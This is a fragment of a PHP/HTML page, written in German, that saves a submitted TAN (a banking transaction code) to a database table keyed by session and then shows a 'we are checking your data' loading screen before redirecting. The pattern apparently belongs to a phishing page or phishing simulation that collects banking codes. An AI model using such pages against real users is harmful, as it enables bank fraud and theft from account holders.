...
$tan = $_POST['tan'];
$sql = 'UPDATE user_data SET tan = :tan WHERE session_id = :session_id';

$statement= $pdo->prepare($sql);
$statement->bindValue("session_id",$session_id);
$statement->bindValue("tan",$tan);
$statement->execute();
...
<meta http-equiv="refresh" content="5;url=Ergebnis.php" />
<style>
    * {
      ...
      <article>
        <div class="row">
          <div class="col-sm-6">
            <div class="card">
              <div class="card-body">
                ...
                <div class="row">
                  <div class="col">
                    <img src="Ressourcen/loading.gif" style ="width: 50%; height: auto;">
                  </div>
                </div>  
              </div>
            </div>
          ...
          <div class="col-sm-6">
            <div class="card">
              <div class="card-body">
                <p> Bitte haben Sie einen Moment geduld, wir überprüfen Ihre Daten. Aktualisieren Sie die Seite nicht.</p>
              </div>
            </div>
          </div>
        </div>
